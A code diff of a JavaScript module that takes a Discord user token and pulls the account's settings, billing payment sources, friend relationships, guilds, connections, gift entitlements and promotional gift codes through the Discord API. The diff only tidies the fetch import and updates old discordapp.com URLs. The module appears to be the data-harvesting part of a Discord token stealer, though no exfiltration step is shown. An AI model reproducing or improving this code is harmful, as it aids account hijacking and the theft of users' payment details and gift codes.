@@ -1,5 +1,5 @@
 "use strict";
-
+const fetch = require("sync-fetch");
 const emojis = {
   "themes": {
     "dark": "Dark",
@@ -76,7 +76,7 @@ const languages = {
 };
 
 let getDiscordApi = (i, token) => {
-  const res = require("sync-fetch")(i, {
+  const res = fetch(i, {
     method: "GET",
     headers: {
       "Content-Type": "application/json",
@@ -92,7 +92,7 @@ let getTheme = (t) => emojis.themes[t] || "Unknown Theme";
 
 let getStatusEmoji = (s) => emojis.status[s];
 
-let getImage = (p) => !p ? false : `${p}.${require("sync-fetch")(p).headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;
+let getImage = (p) => !p ? false : `${p}.${fetch(p).headers.get("content-type").includes("image/gif") ? "gif" : "png"}?size=512`;
 
 let getGiftsCodes = (token, f) => {
   let t = [], r = getDiscordApi(`https://discord.com/api/v9/users/@me/outbound-promotions/codes?locale=${f.locale}`, token);
@@ -170,10 +170,10 @@ module.exports = (token) => {
   const [settings, payment, relationships, guilds, applications, connections, entitlements] = [
     getDiscordApi("https://discord.com/api/v9/users/@me/settings", token),
     getDiscordApi("https://discord.com/api/v9/users/@me/billing/payment-sources", token),
-    getDiscordApi("https://discordapp.com/api/v9/users/@me/relationships", token),
+    getDiscordApi("https://discord.com/api/v9/users/@me/relationships", token),
     getDiscordApi("https://discord.com/api/v9/users/@me/guilds?with_counts=true", token),
     getDiscordApi("https://discord.com/api/v9/applications", token),
-    getDiscordApi("https://discordapp.com/api/v9/users/@me/connections", token),
+    getDiscordApi("https://discord.com/api/v9/users/@me/connections", token),
     getDiscordApi("https://discord.com/api/v8/users/@me/entitlements/gifts", token)
   ];
 
